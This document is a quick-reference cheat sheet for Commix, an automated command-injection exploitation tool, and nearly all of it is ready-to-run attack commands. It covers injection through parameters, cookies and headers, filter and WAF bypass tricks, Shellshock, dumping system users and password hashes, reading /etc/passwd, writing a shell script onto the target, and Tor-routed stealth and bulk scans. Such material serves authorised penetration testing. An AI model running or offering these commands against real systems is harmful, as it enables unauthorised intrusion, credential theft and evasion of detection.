# Commix Quick Reference

## Basic Exploitation

```bash
# GET-based injection
commix --url="http://192.168.1.100/vuln.php?cmd=test"

# POST-based injection
commix --url="http://192.168.1.100/vuln.php" --data="ip=127.0.0.1"

# With cookies
commix --url="http://192.168.1.100/vuln.php?cmd=test" --cookie="PHPSESSID=abc123"

# Single command execution
commix --url="http://192.168.1.100/vuln.php?cmd=test" --os-cmd="id"

# JSON injection
commix --url="http://192.168.1.100/api" --data='{"addr":"127.0.0.1"}'

# XML injection
commix --url="http://192.168.1.100/api" --data='<?xml version="1.0"?><ping><addr>127.0.0.1</addr></ping>'
```

## Header Injection

```bash
# User-Agent injection
commix --url="http://192.168.1.100/vuln.php" --level=3 -p user-agent

# Referer injection
commix --url="http://192.168.1.100/vuln.php" --level=3 -p referer

# Cookie injection
commix --url="http://192.168.1.100/vuln.php" --level=2 --cookie="addr=127.0.0.1"

# Custom header injection
commix --url="http://192.168.1.100/vuln.php" --headers="X-Custom: payload"
```

## Filter Bypass

```bash
# Bypass no-space filter (use $IFS)
commix --url="..." --data="addr=127.0.0.1" --tamper="space2ifs"

# Bypass command blacklist (insert uninitialized variables)
commix --url="..." --data="addr=127.0.0.1" --tamper="uninitializedvariable"

# Bypass domain validation (append suffix)
commix --url="..." --data="addr=127.0.0.1" --suffix="d.e.f"

# Nested quotes bypass
commix --url="..." --data="addr=127.0.0.1" --level=3

# File-based technique (bypass character filtering)
commix --url="..." --data="addr=127.0.0.1" --technique=f --web-root="/var/www/html/"
```

## Techniques

```bash
# Force specific technique
commix --url="..." --technique=T        # Time-based (blind)
commix --url="..." --technique=f        # File-based (semi-blind)
commix --url="..." --technique=CF       # Classic + File-based

# Force OS
commix --url="..." --os="Windows"
commix --url="...", --os="Unix"

# Alternative shell
commix --url="..." --alter-shell="Python"
```

## Shellshock

```bash
commix --url="http://192.168.1.100/cgi-bin/status" --shellshock
```

## Enumeration

```bash
commix --url="..." --all               # Everything
commix --url="..." --current-user      # Current user
commix --url="..." --hostname          # Hostname
commix --url="..." --is-root           # Root check
commix --url="..." --sys-info          # System info
commix --url="..." --users             # System users
commix --url="..." --passwords         # Password hashes
```

## File Operations

```bash
commix --url="..." --file-read="/etc/passwd"
commix --url="..." --file-write="/tmp/shell.sh" --file-dest="/tmp/shell.sh"
```

## Automation

```bash
# Bulk scan
commix -m targets.txt --batch

# Parse Burp log
commix -l burp_log.txt --batch

# Time-limited
commix --url="..." --time-limit=3600 --batch

# Resume session
commix -s ~/.commix/output/target/session.sqlite
```

## Network Options

```bash
# Proxy
commix --url="..." --proxy="127.0.0.1:8080"

# Tor
commix --url="..." --tor --tor-port=9050

# Auth
commix --url="..." --auth-url="http://target/login" --auth-data="user=admin&pass=admin"

# SSL/Timeout
commix --url="..." --force-ssl --timeout=60
```

## Crawl

```bash
commix --url="http://192.168.1.100/" --crawl=2 --crawl-exclude="logout"
```

## Useful Combos

```bash
# Full stealth assessment
commix --url="..." --random-agent --delay=2 --tor --batch

# Max detection
commix --url="..." --level=3 --smart --batch

# WAF bypass
commix --url="..." --tamper="uninitializedvariable" --random-agent --technique=f

# Quick RCE proof
commix --url="..." --os-cmd="id" --batch
```

## Flags Cheat Sheet

| Flag | Short | Purpose |
|------|-------|---------|
| `--url` | `-u` | Target URL |
| `--data` | `-d` | POST data |
| `--cookie` | | Cookie header |
| `--level` | | Test depth (1-3) |
| `--technique` | | Force technique |
| `--tamper` | | Payload evasion script |
| `--os-cmd` | | Run single command |
| `--batch` | | Non-interactive mode |
| `--random-agent` | | Random User-Agent |
| `--proxy` | | HTTP proxy |
| `--tor` | | Use Tor |
| `--file-read` | | Read remote file |
| `--all` | | Full enumeration |
| `-s` | | Load session file |
| `-m` | | Bulk scan file |
| `--list-tampers` | | List evasion scripts |
